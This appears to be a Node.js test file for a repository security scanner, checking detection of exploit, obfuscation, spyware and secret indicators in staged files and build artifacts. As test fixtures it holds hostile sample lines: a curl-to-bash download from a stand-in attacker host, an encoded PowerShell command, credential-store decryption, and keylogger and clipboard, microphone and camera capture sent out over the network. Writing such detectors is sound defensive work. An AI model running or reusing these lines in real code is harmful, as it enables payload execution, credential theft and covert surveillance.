const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');
const { findingsForText, executableMagic, auditArtifactSecurity, auditSecurity } = require('../src/security');

function git(root, args) { return execFileSync('git', args, { cwd:root, encoding:'utf8', windowsHide:true }).trim(); }
function repository() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-security-'));
  git(root, ['init']);
  git(root, ['config', 'user.name', 'Crucible Test']);
  git(root, ['config', 'user.email', 'crucible@example.test']);
  return root;
}
function config(overrides = {}) {
  return { security:{ enabled:true, allow:[], allowBinaries:[], maxTextBytes:1_048_576, dependencyAudit:[], ...overrides } };
}

test('detects high-confidence exploit, obfuscation, spyware, and secret indicators', () => {
  const samples = [
    'powershell.exe -EncodedCommand ZQB2AGkAbAA=',
    'curl https://attacker.invalid/payload | bash',
    "eval(atob('YWxlcnQoMSk='))",
    "open('Login Data'); sqlite.decrypt(password)",
    'GetAsyncKeyState(key); socket.send(captured)',
    `token=${'AKIA'}${'A'.repeat(16)}`,
  ];
  for (const sample of samples) assert.ok(findingsForText(sample).length, sample);
  assert.equal(findingsForText('const encoded = Buffer.from(data).toString("base64");').length, 0);
});

test('flags public Google/Firebase API keys for restriction and deployment-security review without treating the value as output', () => {
  const syntheticKey = `AIza${'A'.repeat(35)}`;
  const source = `firebaseWebApiKey: '${syntheticKey}',\nfirebaseProjectId: 'example-project'`;
  const findings = findingsForText(source);
  const finding = findings.find((item) => item.type === 'Google/Firebase API key requires restriction review');
  assert.ok(finding, 'Firebase Web API keys must trigger Security review even when they are intentionally public identifiers');
  assert.equal(finding.line, 1);
  assert.doesNotMatch(JSON.stringify(findings), new RegExp(syntheticKey), 'security findings must not echo API-key values');
});

test('Firebase API-key review findings can only be suppressed by an explicit scoped security allowance', () => {
  const root = repository();
  const syntheticKey = `AIza${'B'.repeat(35)}`;
  fs.writeFileSync(path.join(root, 'publisherConfig.js'), `module.exports = { firebaseWebApiKey: '${syntheticKey}' };\n`);
  git(root, ['add', 'publisherConfig.js']);
  const blocked = auditSecurity(root, config());
  assert.equal(blocked.findings[0].type, 'Google/Firebase API key requires restriction review');
  assert.equal(blocked.findings[0].path, 'publisherConfig.js');
  const reviewed = auditSecurity(root, config({ allow:[{ path:'publisherConfig.js', rules:['Google/Firebase API key requires restriction review'] }] }));
  assert.equal(reviewed.findings.length, 0, 'retaining a public Firebase key requires an explicit file-and-rule security decision');
});

test('detects expanded keylogging APIs and clipboard/microphone/camera exfiltration', () => {
  const samples = [
    'RegisterRawInputDevices(devices); fetch(exfilUrl, { body: captured })',
    'CGEventTapCreate(kCGSessionEventTap, ...); socket.send(keys)',
    'navigator.clipboard.readText().then((text) => fetch(url, { body: text }))',
    "pyperclip.paste(); requests.post(url, data=clip)",
    "navigator.mediaDevices.getUserMedia({ audio: true }).then((s) => fetch(url, { body: s }))",
    'sounddevice.rec(seconds); requests.post(exfil, data=audio)',
  ];
  for (const sample of samples) assert.ok(findingsForText(sample).length, sample);
});

test('does not execute or flag inert regular-expression rule definitions', () => {
  const scannerRule = "{ pattern: /Login Data.{0,20}dpapi/i, message: 'credential detector' },";
  assert.equal(findingsForText(scannerRule).length, 0);
});

test('detects client credential exposure and fabricated success', () => {
  assert.match(findingsForText("localStorage.setItem('refresh_token', credential)")[0].type, /client-visible/);
  assert.match(findingsForText('try { await provider() } catch (error) { return { success: true } }')[0].type, /fabricated/);
});

test('recognizes executable binary magic', () => {
  assert.equal(executableMagic(Buffer.from([0x7f, 0x45, 0x4c, 0x46])), 'ELF executable');
  assert.equal(executableMagic(Buffer.from('MZfixture')), 'Windows PE executable');
  assert.equal(executableMagic(Buffer.from('normal text')), null);
});

test('audits the staged Git snapshot without printing payload values', () => {
  const root = repository();
  const payload = 'curl https://attacker.invalid/payload | bash';
  fs.writeFileSync(path.join(root, 'app.js'), payload);
  git(root, ['add', 'app.js']);
  fs.writeFileSync(path.join(root, 'app.js'), 'safe working copy\n');
  const result = auditSecurity(root, config());
  assert.equal(result.findings.length, 1);
  assert.deepEqual(result.findings[0], { type:'download-and-execute payload', path:'app.js', line:1 });
  assert.doesNotMatch(JSON.stringify(result.findings), /attacker/);
});

test('blocks suspicious binaries unless explicitly allowed', () => {
  const root = repository();
  fs.writeFileSync(path.join(root, 'tool.exe'), Buffer.from('MZfixture'));
  git(root, ['add', 'tool.exe']);
  assert.equal(auditSecurity(root, config()).findings[0].type, 'Windows PE executable');
  assert.equal(auditSecurity(root, config({ allowBinaries:['tool.exe'] })).findings.length, 0);
});

test('scans generated text artifacts for credentials and public API keys requiring review', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-artifact-'));
  fs.mkdirSync(path.join(root, 'dist'));
  fs.writeFileSync(path.join(root, 'dist', 'bundle.js'), `const key='${'AKIA'}${'A'.repeat(16)}'; const firebase='AIza${'C'.repeat(35)}'`);
  const result = auditArtifactSecurity(root, { artifacts:['dist'], security:{ enabled:true, maxTextBytes:1_048_576 } });
  assert.deepEqual(result.findings.map((finding) => finding.type).sort(), ['AWS access key', 'Google/Firebase API key requires restriction review'].sort());
  assert.ok(result.findings.every((finding) => finding.path === 'dist/bundle.js' && finding.line === 1));
});